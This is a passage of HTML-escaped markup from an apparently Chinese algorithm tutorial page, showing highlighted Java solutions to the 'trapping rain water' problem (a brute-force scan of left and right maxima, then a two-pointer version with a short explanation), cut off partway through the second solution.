&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;trap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;l_max&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r_max&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// 找右边最高的柱子&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r_max&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r_max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// 找左边最高的柱子&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;l_max&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;l_max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// 如果自己就是最高的话，&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// l_max == r_max == height[i]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;min&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;l_max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r_max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;双指针&#34;&gt;双指针&lt;/h2&gt;
&lt;p&gt;我们用双指针边走边算，节省下空间复杂度，这个问题要这么思考，我们只在乎min(l_max, r_max)。我们已经知道l_max &amp;lt; r_max了，至于这个r_max是不是右边最大的，不重要，重要的是height[i]能够装的水只和较低的l_max之差有关&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;trap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;l_max&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r_max&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;l_max&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;l_max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r_max&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r_max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// res += min(l_max, r_max) - height[i]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;l_max&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r_max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;l_max&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
